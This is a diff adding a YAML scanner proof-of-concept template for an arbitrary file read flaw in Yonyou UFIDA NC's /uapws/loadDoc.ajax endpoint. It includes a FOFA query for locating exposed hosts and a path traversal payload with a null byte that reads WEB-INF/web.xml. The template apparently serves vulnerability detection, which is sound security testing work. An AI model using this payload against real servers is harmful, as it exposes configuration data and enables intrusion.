@@ -1,0 +1,21 @@
+id: poc-yaml-yonyou-ufida-nc-loaddoc-ajax-anyfile-read
+info:
+  name: 用友NC loadDoc.ajax 文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: ufida-nc
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"ufida")
+- method: POST
+  path: /uapws/loadDoc.ajax
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: ws=../../WEB-INF/web.xml%00
+  expression: status_code == 200 && contains(body,"</web-app>") && matches(body,"<servlet-name>(.*?)</servlet-name>")
+    && matches(body,"<filter-class>(.*?)</filter-class>")
+variables: {}
+transport: http
